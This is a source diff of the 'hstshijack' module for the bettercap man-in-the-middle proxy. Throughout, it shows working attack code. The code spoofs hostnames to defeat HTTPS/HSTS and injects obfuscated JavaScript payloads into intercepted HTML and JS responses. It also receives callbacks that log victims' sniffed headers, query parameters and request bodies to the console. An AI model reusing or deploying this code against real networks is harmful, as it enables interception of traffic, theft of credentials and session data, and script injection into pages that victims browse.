@@ -7,13 +7,13 @@ var ssl_log = [],
 var payload,
     payload_path,
     payload_container = new String(
-    	"if (!self.{{session_id}}) {\n" +
-    		"var {{session_id}} = function() {\n" +
-    			"{{variables}}\n" +
-    			"{{payload}}\n" +
-    			"{{custom_payload}}\n" +
-    		"}\n" +
-    		"{{session_id}}();\n" +
+    	"if (!{{session_id}}) {\n" + 
+    		"var {{session_id}} = function() {\n" + 
+    			"{{variables}}\n" + 
+				"{{payload}}\n" + 
+				"{{custom_payload}}\n" + 
+    		"}\n" + 
+    		"{{session_id}}();\n" + 
     	"}\n")
 
 var ignore_hosts       = [],
@@ -34,11 +34,13 @@ var callback_path,
 
 var math_seed
 
-var red    = "\033[31m",
-    yellow = "\033[33m",
-    green  = "\033[32m",
-    bold   = "\033[1;37m",
-    reset  = "\033[0m"
+var red      = "\033[31m",
+    yellow   = "\033[33m",
+    green    = "\033[32m",
+    blue     = "\033[34m",
+    on_white = "\033[0;30m",
+    bold     = "\033[1;37m",
+    reset    = "\033[0m"
 
 /* Declare functions */
 
@@ -121,27 +123,32 @@ function configure() {
 	}
 	// Preload custom payloads.
 	p = {}
-	for (var i = 0; i < custom_payloads.length; i++) {
-		!custom_payloads[i].match(/^(?:\*|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+?$/) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.custompayloads value (got " + custom_payloads[i] + ").") : ""
-		host = custom_payloads[i].replace(/\:.*/, "")
-		path = custom_payloads[i].replace(/.*\:/, "")
+	for (var a = 0; a < custom_payloads.length; a++) {
+		if ( !custom_payloads[a].match(/^(?:\*|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+?$/) ) {
+			log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.custompayloads value (got " + custom_payloads[a] + ").")
+		}
+
+		host = custom_payloads[a].replace(/[:].*/, "")
+		path = custom_payloads[a].replace(/.*[:]/, "")
+
 		if ( !readFile(path) ) {
-			log_fatal("(" + green + "hstshijack" + reset + ") Could not read a path in hstshijack.custompayloads (got " + path + ").")
-		}
-		custom_payload = readFile(path)
-		custom_payload = custom_payload.replace(/obf_path_whitelist/g, whitelist_path)
-		custom_payload = custom_payload.replace(/obf_path_callback/g, callback_path)
-		if (obfuscate) {
-			obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
-			for (var i = 0; i < obfuscation_variables.length; i++) {
-				regexp = new RegExp(obfuscation_variables[i], "ig")
-				custom_payload = custom_payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
-			}
-		}
-		if (p[host]) {
-			p[host] = { "payload": p[host].payload + "\n" + custom_payload }
+			log_error("(" + green + "hstshijack" + reset + ") Could not read a path in hstshijack.custompayloads (got " + path + ").")
 		} else {
-			p[host] = { "payload": custom_payload }
+			custom_payload = readFile(path).replace(/obf_path_whitelist/g, whitelist_path).replace(/obf_path_callback/g, callback_path)
+
+			if (obfuscate) {
+				obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
+				for (var b = 0; b < obfuscation_variables.length; b++) {
+					regexp = new RegExp(obfuscation_variables[b], "ig")
+					custom_payload = custom_payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
+				}
+			}
+
+			if (p[host]) {
+				p[host] = { "payload": p[host].payload + "\n" + custom_payload }
+			} else {
+				p[host] = { "payload": custom_payload }
+			}
 		}
 	}
 	custom_payloads = p
@@ -257,121 +264,182 @@ function onLoad() {
 
 function onRequest(req, res) {
 
-/* Attack or ignore request */
-
 	ignored = false
 
-	// Redirect client to the real host if a whitelist callback was received.
-	if (whitelist[req.Client]) {
-		whitelisted_hosts = whitelist[req.Client].split(",")
-		for (var a = 0; a < whitelisted_hosts.length; a++) {
-			var regexp
-			if ( whitelisted_hosts[a].indexOf("*") > -1 ) {
-				regexp = toWholeWildcardRegexp(whitelisted_hosts[a])
-			} else {
-				regexp = toWholeRegexp(whitelisted_hosts[a])
-			}
-			if ( req.Hostname.match(regexp) ) {
-				var new_host
-				for (var b = 0; b < replacement_hosts.length; b++) {
-					if ( replacement_hosts.indexOf("*") > -1 ) {
-						regexp = toWholeWildcardRegexp(replacement_hosts[b])
-					} else {
-						regexp = toWholeRegexp(replacement_hosts[b])
-					}
-					if ( req.Hostname.match(regexp) ) {
-						var replacement
-						if (replacement_hosts[b].indexOf("*") > -1) {
-							replacement = "$1" + target_hosts[b].original.replace("*.", "")
-						} else {
-							replacement = target_hosts[b].original
-						}
-						new_host = req.Hostname.replace(regexp, replacement)
-						res.SetHeader( "Location", "https://" + new_host + req.Path + ( req.Query != "" ? ("?" + req.Query) : "" ) )
-						res.Status = 301
-						break
-					}
-				}
-				res.SetHeader("bettercap", "ignore")
-				ignored = true
+/* Handle special callbacks */
 
-				log_info("(" + green + "hstshijack" + reset + ") Redirecting " + req.Client + " from " + req.Hostname + " to " + new_host + " because we received a whitelist callback.")
-				break
+	if (req.Path == "/" + callback_path || req.Path == "/" + whitelist_path || req.Path == "/" + ssl_log_path) {
+
+		// SSL log callback
+		// Requests made for this path will decode a base64 encoded hostname and send a HEAD request to this hostname in search for HTTPS redirects.
+		if (req.Path == "/" + ssl_log_path) {
+			queried_host = atob(req.Query)
+			log_debug("(" + green + "hstshijack" + reset + ") Silent SSL log callback received from " + req.Client + " for " + queried_host + ".")
+			for (var i = 0; i < target_hosts.length; i++) {
+				var regexp
+				if ( target_hosts[i].indexOf("*") > -1 ) {
+					regexp = toWholeWildcardRegexp(target_hosts[i])
+				} else {
+					regexp = toWholeRegexp(target_hosts[i])
+				}
+				if ( queried_host.match(regexp) ) {
+					if ( ssl_log.indexOf(queried_host) == -1 ) {
+						log_debug("(" + green + "hstshijack" + reset + ") Learning HTTP response from " + queried_host + " ...")
+						req.Hostname = queried_host
+						req.Path     = "/"
+						req.Query    = ""
+						req.Body     = ""
+						req.Method   = "HEAD"
+					}
+					break
+				}
 			}
 		}
-	}
 
-	if (!ignored) {
+		// Basic callback
+		// Requests made for this path will print sniffed data.
+		// Requests made for this path will not be proxied.
+		if (req.Path == "/" + callback_path) {
+			// log_info("(" + green + "hstshijack" + reset + ") Silent callback received from " + req.Client + " for " + req.Hostname)
 
-	/* Handle special callbacks */
+			// var logStr = "(" + green + "hstshijack" + reset + ") CALLBACK " + req.Scheme + "://" + req.Hostname + req.Path + "\n\n"
 
-		if (req.Path == "/" + callback_path || req.Path == "/" + whitelist_path || req.Path == "/" + ssl_log_path) {
+			// logStr += "  " + bold + "Headers" + reset + "\n\n"
+			// headers = req.Headers.split("\r\n")
+			// for (var i = 0; i < headers.length; i++) {
+			// 	if ( headers[i].split(": ").length == 2 ) {
+			// 		params = headers[i].split(": ")
+			// 		logStr += "    " + green + params[0] + reset + ": " + bold + params[1] + reset + "\n"
+			// 	} else {
+			// 		logStr += "    " + bold + headers[i] + reset + "\n"
+			// 	}
+			// }
 
-			// Requests made for this path will decode a base64 encoded hostname and send a HEAD request to this hostname in search for HTTPS redirects.
-			if (req.Path == "/" + ssl_log_path) {
-				queried_host = atob(req.Query)
-				log_debug("(" + green + "hstshijack" + reset + ") Silent SSL log callback received from " + req.Client + " for " + queried_host + ".")
-				for (var i = 0; i < target_hosts.length; i++) {
-					var regexp
-					if ( target_hosts[i].indexOf("*") > -1 ) {
-						regexp = toWholeWildcardRegexp(target_hosts[i])
-					} else {
-						regexp = toWholeRegexp(target_hosts[i])
-					}
-					if ( queried_host.match(regexp) ) {
-						if ( ssl_log.indexOf(queried_host) == -1 ) {
-							log_debug("(" + green + "hstshijack" + reset + ") Learning HTTP response from " + queried_host + " ...")
-							req.Hostname = queried_host
-							req.Path     = "/"
-							req.Query    = ""
-							req.Body     = ""
-							req.Method   = "HEAD"
-						}
-						break
-					}
-				}
-			}
+			// logStr += "  " + bold + "Query" + reset + "\n\n"
+			// queries = req.Query.split("&")
+			// for (var i = 0; i < queries.length; i++) {
+			// 	if ( queries[i].split("=").length == 2 ) {
+			// 		params = queries[i].split("=")
+			// 		logStr += "    " + green + decodeURIComponent(params[0]) + reset + " : " + bold + decodeURIComponent(params[1]) + reset + "\n"
+			// 	} else {
+			// 		logStr += "    " + bold + queries[i] + reset + "\n"
+			// 	}
+			// }
 
-			// Requests made for this path will print sniffed data.
-			// Requests made for this path will not be proxied.
-			if (req.Path == "/" + callback_path) {
-				log_info("(" + green + "hstshijack" + reset + ") Silent callback received from " + req.Client + " for " + req.Hostname)
-				req.Scheme = "ignore"
-			}
+			// logStr += "\n  " + bold + "Body" + reset + "\n\n" + "    " + yellow + req.ReadBody() + reset
 
-			// Requests made for this path will print sniffed data.
-			// Requests made for this path will not be proxied.
-			// Requests made for this path will stop all attacks towards this client for the requested hostname.
-			if (req.Path == "/" + whitelist_path) {
-				log_info("(" + green + "hstshijack" + reset + ") Silent, whitelisting callback received from " + req.Client + " for " + req.Hostname)
-				req.Scheme = "ignore"
-				// Add requested hostname to whitelist
-				if (whitelist[req.Client]) {
-					whitelist[req.Client].hosts += "," + req.Hostname
+			// console.log(logStr)
+
+			req.Scheme = "ignore"
+		}
+
+		// Whitelist callback
+		// Requests made for this path will print sniffed data.
+		// Requests made for this path will not be proxied.
+		// Requests made for this path will stop all attacks towards this client for the requested hostname.
+		if (req.Path == "/" + whitelist_path) {
+			log_info("(" + green + "hstshijack" + reset + ") Silent, whitelisting callback received from " + req.Client + " for " + req.Hostname)
+
+			var logStr = "(" + green + "hstshijack" + reset + ") WHITELIST " + req.Scheme + "://" + req.Hostname + req.Path + "\n\n"
+
+			logStr += "  " + bold + "Headers" + reset + "\n\n"
+			headers = req.Headers.split("\n")
+			for (var i = 0; i < headers.length; i++) {
+				if ( headers[i].split(": ").length == 2 ) {
+					params = headers[i].split(": ")
+					logStr += "    " + green + params[0] + reset + ": " + bold + params[1] + reset + "\n"
 				} else {
-					whitelist[req.Client].hosts = req.Hostname
-				}
-				// Also add (wildcard) targets and replacements for requested hostname
-				for (var i = 0; i < target_hosts.length; i++) {
-					var regexp_targets,
-					    regexp_replacements
-					if ( target_hosts.indexOf("*") > -1 ) {
-						regexp_targets      = toWholeWildcardRegexp(target_hosts[i])
-						regexp_replacements = toWholeWildcardRegexp(replacement_hosts[i])
-					} else {
-						regexp_targets      = toWholeRegexp(target_hosts[i])
-						regexp_replacements = toWholeRegexp(replacement_hosts[i])
-					}
-					if ( req.Hostname.match(regexp_targets) || req.Hostname.match(regexp_replacements) ) {
-						whitelist[req.Client].hosts += "," + replacement_hosts[i]
-						whitelist[req.Client].hosts += "," + target_hosts[i]
-					}
+					logStr += "    " + bold + headers[i] + reset + "\n"
 				}
 			}
 
-		} else {
+			logStr += "  " + bold + "Query" + reset + "\n\n"
+			queries = req.Query.split("&")
+			for (var i = 0; i < queries.length; i++) {
+				if ( queries[i].split("=").length == 2 ) {
+					params = queries[i].split("=")
+					logStr += "    " + green + decodeURIComponent(params[0]) + reset + " : " + bold + decodeURIComponent(params[1]) + reset + "\n"
+				} else {
+					logStr += "    " + bold + queries[i] + reset + "\n"
+				}
+			}
 
-	/* Patch Request */
+			logStr += "\n  " + bold + "Body" + reset + "\n\n" + yellow + req.ReadBody() + reset
+
+			console.log(logStr)
+
+			req.Scheme = "ignore"
+			// Add requested hostname to whitelist
+			if (whitelist[req.Client]) {
+				whitelist[req.Client] += "," + req.Hostname
+			} else {
+				whitelist[req.Client] = req.Hostname
+			}
+			// Also add (wildcard) targets and replacements for requested hostname
+			for (var i = 0; i < target_hosts.length; i++) {
+				var regexp_targets,
+				    regexp_replacements
+				if ( target_hosts.indexOf("*") > -1 ) {
+					regexp_targets      = toWholeWildcardRegexp(target_hosts[i])
+					regexp_replacements = toWholeWildcardRegexp(replacement_hosts[i])
+				} else {
+					regexp_targets      = toWholeRegexp(target_hosts[i])
+					regexp_replacements = toWholeRegexp(replacement_hosts[i])
+				}
+				if ( req.Hostname.match(regexp_targets) || req.Hostname.match(regexp_replacements) ) {
+					whitelist[req.Client] += "," + replacement_hosts[i]
+					whitelist[req.Client] += "," + target_hosts[i]
+				}
+			}
+		}
+
+	} else {
+
+	/* Attack or ignore request */
+
+		// Redirect client to the real host if a whitelist callback was received.
+		if (whitelist[req.Client]) {
+			whitelisted_hosts = whitelist[req.Client].split(",")
+			for (var a = 0; a < whitelisted_hosts.length; a++) {
+				var regexp
+				if ( whitelisted_hosts[a].indexOf("*") > -1 ) {
+					regexp = toWholeWildcardRegexp(whitelisted_hosts[a])
+				} else {
+					regexp = toWholeRegexp(whitelisted_hosts[a])
+				}
+				if ( req.Hostname.match(regexp) ) {
+					var new_host
+					for (var b = 0; b < replacement_hosts.length; b++) {
+						if ( replacement_hosts.indexOf("*") > -1 ) {
+							regexp = toWholeWildcardRegexp(replacement_hosts[b])
+						} else {
+							regexp = toWholeRegexp(replacement_hosts[b])
+						}
+						if ( req.Hostname.match(regexp) ) {
+							var replacement
+							if (replacement_hosts[b].indexOf("*") > -1) {
+								replacement = "$1" + target_hosts[b].original.replace("*.", "")
+							} else {
+								replacement = target_hosts[b].original
+							}
+							new_host = req.Hostname.replace(regexp, replacement)
+							res.SetHeader( "Location", "https://" + new_host + req.Path + ( req.Query != "" ? ("?" + req.Query) : "" ) )
+							res.Status = 301
+							break
+						}
+					}
+					res.SetHeader("bettercap", "ignore")
+					ignored = true
+
+					log_info("(" + green + "hstshijack" + reset + ") Redirecting " + req.Client + " from " + req.Hostname + " to " + new_host + " because we received a whitelist callback.")
+					break
+				}
+			}
+		}
+
+		if (!ignored) {
+
+		/* Patch Request */
 
 			// Patch spoofed hostnames.
 			for (var a = 0; a < target_hosts.length; a++) {
@@ -569,19 +637,22 @@ function onResponse(req, res) {
 		}
 
 		// Inject payloads.
-		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head>/i) ) {
-			injection = ""
+		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head[^>]*?>/i) ) {
+			injection = payload
 
 			for ( var a = 0; a < Object.keys(custom_payloads).length; a++ ) {
+				host = Object.keys(custom_payloads)[a]
+
 				var regexp
-				if ( Object.keys(custom_payloads)[a].indexOf("*") > -1 ) {
-					regexp = toWholeWildcardRegexp( Object.keys(custom_payloads)[a] )
+
+				if ( host.indexOf("*") > -1 ) {
+					regexp = toWholeWildcardRegexp(host)
 				} else {
-					regexp = toWholeRegexp( Object.keys( custom_payloads)[a] )
+					regexp = toWholeRegexp(host)
 				}
+
 				if ( req.Hostname.match(regexp) ) {
-					// Insert special callback paths.
-					injection = payload.replace("{{custom_payload}}", Object.keys(custom_payloads)[a].payload + "\n{{custom_payload}}")
+					injection = injection.replace("{{custom_payload}}", custom_payloads[host].payload + "\n{{custom_payload}}")
 					log_debug("(" + green + "hstshijack" + reset + ") Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
 				}
 			}
@@ -591,11 +662,11 @@ function onResponse(req, res) {
 			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
 				res.Body = injection + res.Body
 				log_debug("(" + green + "hstshijack" + reset + ") Injected payloads into JS file from " + req.Hostname + ".")
-			} else if ( res.Body.match(/<head>/i) ) {
+			} else if ( res.Body.match(/<head[^>]*?>/i) ) {
 				if (encode) {
-					res.Body = res.Body.replace(/<head>/i, "<head><script src=\"data:application/javascript;base64," + btoa(injection) + "\"></script>")
+					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + btoa(injection) + "\"></script>")
 				} else {
-					res.Body = res.Body.replace(/<head>/i, "<head><script>" + injection + "</script>")
+					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script>" + injection + "</script>")
 				}
 				log_debug("(" + green + "hstshijack" + reset + ") Injected payloads into HTML file from " + req.Hostname + ".")
 			}
@@ -612,7 +683,6 @@ function onResponse(req, res) {
 
 		// Replace hosts in headers.
 		for (var a = 0; a < target_hosts.length; a++) {
-			// regexp = new RegExp( target_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") , "igm" )
 			var regexp
 			if ( target_hosts[a].indexOf("*") > -1 ) {
 				regexp = toWildcardRegexp(target_hosts[a])
